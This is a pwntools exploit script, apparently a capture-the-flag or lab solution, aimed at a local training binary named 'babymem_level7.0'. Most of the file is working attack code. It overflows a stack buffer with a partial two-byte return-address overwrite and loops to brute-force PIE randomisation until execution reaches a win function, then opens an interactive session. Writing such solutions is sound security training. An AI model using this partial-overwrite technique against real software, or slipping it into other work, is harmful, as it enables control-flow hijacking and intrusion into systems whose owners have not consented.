#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babymem_level7.0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./babymem_level7.0")
context.terminal = ["alacritty", "-e", "sh", "-c"]  # linux/alacritty

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No


while True:
    io = start()
    length = 200
    offset = cyclic_find(0x6261616F6261616E)
    pay = asm("nop") * offset + p16(0x0592)
    io.sendline(str(len(pay)))

    io.send(pay)
    # io.interactive()

    a = io.recvall().decode("UTF-8")
    b = "win_authed() is "
    x = a[a.find(b) + len(b) :].split(".")[0]
    print(x)
    if int(x[-4:-3], 16) == 0:
        print(a)
        io.interactive()
        break
